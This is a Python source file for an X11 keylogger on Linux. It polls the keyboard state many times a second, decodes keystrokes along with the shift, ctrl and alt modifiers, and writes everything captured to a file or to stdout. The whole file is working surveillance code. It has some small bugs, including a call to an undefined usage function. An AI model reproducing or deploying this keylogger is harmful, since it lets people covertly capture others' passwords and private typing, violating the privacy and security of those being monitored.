#!/usr/bin/env python3

import sys,os
import time
import getopt
import signal
import subprocess
import ctypes as ct
from ctypes.util import find_library


# linux only!
assert("linux" in sys.platform)


X11 = ct.cdll.LoadLibrary(find_library("X11"))
DISPLAY = X11.XOpenDisplay(None)
STATE = (ct.c_char * 32)()


DEFAULT_OUT_PATH = sys.stdout
HANDLE = DEFAULT_OUT_PATH

from keyboard import Keyboard
KB = Keyboard()

# Check for modifications.
last_shift = None
last_ctrl = None
last_alt = None
last_keys = None

last_last_shift = None
last_last_ctrl = None
last_last_alt = None
last_last_keys = None


def DEFAULT_FORMAT(key):
    return key


def DEFAULT_DONE():
    return False


def cleanExit(signal, frame):
    print()
    print("[-] Received signal to stop, cleaning.")
    HANDLE.close()
    sys.exit(1)


def stateUnchanged(shift, ctrl, alt, keys):
    global last_shift,last_ctrl,last_alt,last_keys,last_last_shift,last_last_ctrl,last_last_alt,last_last_keys
    return (keys
            and shift == last_shift and ctrl == last_ctrl and alt == last_alt and keys == last_keys
            and last_shift == last_last_shift and last_ctrl == last_last_ctrl
            and last_alt == last_last_alt and last_keys == last_last_keys)


def updateState(shift, ctrl, alt, keys):
    global last_shift,last_ctrl,last_alt,last_keys,last_last_shift,last_last_ctrl,last_last_alt,last_last_keys

    last_last_shift  = last_shift
    last_last_ctrl   = last_ctrl
    last_last_alt    = last_alt
    last_last_keys   = last_keys
    
    last_shift  = shift
    last_ctrl   = ctrl
    last_alt    = alt
    last_keys   = keys


def getKeys():
    global CAPS_STATE

    ret = ""

    X11.XQueryKeymap(DISPLAY, STATE)
    leds = subprocess.Popen("xset q | grep LED", shell=True, stdout=subprocess.PIPE).communicate()[0][65]-ord("0")

    # Check for modifiers
    shift = bool(ord(STATE[6]) == 4 or ord(STATE[7]) == 64 or (leds & 1))
    ctrl = bool(ord(STATE[4]) == 32 or ord(STATE[13]) == 2)
    alt = bool(ord(STATE[8]) == 1 or ord(STATE[13]) == 16)

    keys = KB.getKeys(STATE)
    if stateUnchanged(shift, ctrl, alt, keys):
        return "<...>"
    else:
        updateState(shift, ctrl, alt, keys)
        for k in keys:
            if alt:
                ret += "^["

            if ctrl:
                ret += "^"

            if type(k) == tuple:
                if shift:
                    ret += k[1]
                else:
                    ret += k[0]
            else:
                ret += k

        return ret


def log(done=DEFAULT_DONE, pprint=DEFAULT_FORMAT, delay=.07):
    while not done():
        HANDLE.write(pprint(getKeys()))
        HANDLE.flush()
        time.sleep(delay)


if __name__ == "__main__":
    outPath = ""

    try:
        optlist,args = getopt.getopt(sys.argv[1:], "ho:", ["help"])
    except getopt.GetoptError as err:
        print(err)
        usage(sys.argv[0])
        sys.exit(2)

    for o,a in optlist:
        if o in ("-h", "--help"):
            usage(sys.argv[0])
            sys.exit()
        elif o == "-o":
            outPath = a
        else:
            assert False, "[-] Unhandled option."


    # Handle SIGINT for clean exit.
    signal.signal(signal.SIGINT, cleanExit)

    # Start recording.
    if outPath != "":
        HANDLE=open(outPath, "w")

    log()
